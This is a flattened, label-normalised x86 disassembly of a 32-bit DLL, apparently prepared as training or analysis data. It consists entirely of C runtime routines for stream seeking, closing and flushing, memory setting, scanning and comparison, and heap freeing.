push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100190d8
pop ecx
push eax
call sub_10019b02
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_10011554
push 0xc
push r--data
call sub_10018984
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100114ca
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100115cf
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_100189c9
retn
cmp edi 0x2
jne r-xdata
sub_100115d9
mov edi edi
push ebp
mov ebp esp
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001a0c7
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
or eax 0xffffffff
mov [ esi + 0x4 ] edx
cmp ecx eax
je r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebp
retn
pop esi
xor eax eax
sub_10011647
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_1001a1ad
add esp 0x10
pop esi
pop ebp
retn
sub_1001168c
push 0xc
push r--data
call sub_10018984
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x4
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_100189c9
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp eax 0x40
jne r-xdata
cmp eax 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] ebx
push esi
call sub_1001178a
push esi
call sub_1001a1fc
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test [ ebp + 0x10 ] 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_100166a9
pop ecx
cmp eax ebx
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011780
mov eax [ ebp - 0x1c ]
sub_1001178a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_100190d8
pop ecx
push eax
call sub_1001983d
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100117f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1001178a
pop ecx
test eax eax
je r-xdata
push esi
call sub_1001183a
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_100190d8
push eax
call sub_1001a22d
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1001183a
push 0x14
push r--data
call sub_10018984
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001190b
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_100189c9
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10013570
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_100118dc
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_100117f2
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_100117f2
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10011914
push 0xc
push r--data
call sub_10018984
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_100117f2
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001195d
mov eax [ ebp - 0x1c ]
push esi
call sub_1001183a
pop ecx
jmp r-xdata
call sub_100189c9
retn
sub_10011970
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_100167f3
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_1001178a
push esi
mov ebx eax
call sub_1001a1fc
push esi
call sub_100190d8
push eax
call sub_1001a559
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_10011c31
pop ecx
mov [ esi + 0x1c ] edi
sub_100119e7
push 0xc
push r--data
call sub_10018984
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_10011970
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011a5b
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_100189c9
retn
mov eax [ ebp - 0x1c ]
sub_10011a63
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b28a
add esp 0x14
pop ebp
retn
sub_10011a90
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1001b369
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10011b30
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_10011be0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10011c31
push 0xc
push r--data
call sub_10018984
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100189c9
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1001b4b7
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_100167f3
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100167b1
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011c87
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_1001b4e7
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_10011cbf
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_100132bf ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
